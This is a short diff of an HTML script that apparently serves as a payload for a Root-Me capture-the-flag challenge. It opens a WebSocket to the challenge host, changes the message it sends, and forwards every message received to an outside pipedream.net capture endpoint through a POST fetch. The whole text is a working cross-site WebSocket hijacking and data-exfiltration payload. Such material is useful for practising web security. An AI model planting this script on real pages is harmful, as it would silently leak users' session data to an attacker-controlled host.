@@ -3,7 +3,7 @@
     <script>
     var ws = new WebSocket('ws://ctf18.root-me.org/ws');
     ws.onopen = function() {
-        ws.send("hello");
+        ws.send("Receive a compliment");
     };
     ws.onmessage = function(event) {
         fetch('https://eotoci65n24zl7e.m.pipedream.net/', {method: 'POST', mode: 'no-cors', body: event.data});
